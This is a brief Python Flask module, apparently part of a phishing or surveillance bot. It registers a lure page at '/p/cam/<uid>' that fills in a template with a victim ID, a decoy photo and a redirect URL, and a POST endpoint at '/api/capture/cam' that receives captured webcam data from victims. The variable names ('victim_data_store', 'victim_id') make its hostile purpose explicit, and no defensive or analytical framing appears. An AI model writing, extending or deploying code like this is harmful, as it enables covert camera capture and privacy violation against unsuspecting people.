from flask import request
from bot.servers.base import create_capture_route
from bot.utils.storage import victim_data_store

def register_cam_routes(app):
    @app.route('/p/cam/<uid>')
    def cam_page(uid):
        victim_id = request.args.get('v', 'unknown')
        redirect_url = victim_data_store.get(f"redirect_{victim_id}", 'https://google.com')
        photo_url = victim_data_store.get(f"photo_{victim_id}", 'https://via.placeholder.com/600x450/1a1a2e/ffffff?text=No+Photo')
        with open('web/pages/cam.html', 'r') as f:
            html = f.read()
        html = html.replace('{{REDIRECT_URL}}', redirect_url)
        html = html.replace('{{VICTIM_ID}}', victim_id)
        html = html.replace('{{PHOTO_URL}}', photo_url)
        return html
    
    @app.route('/api/capture/cam', methods=['POST'])
    def capture_cam():
        return create_capture_route('cam')()
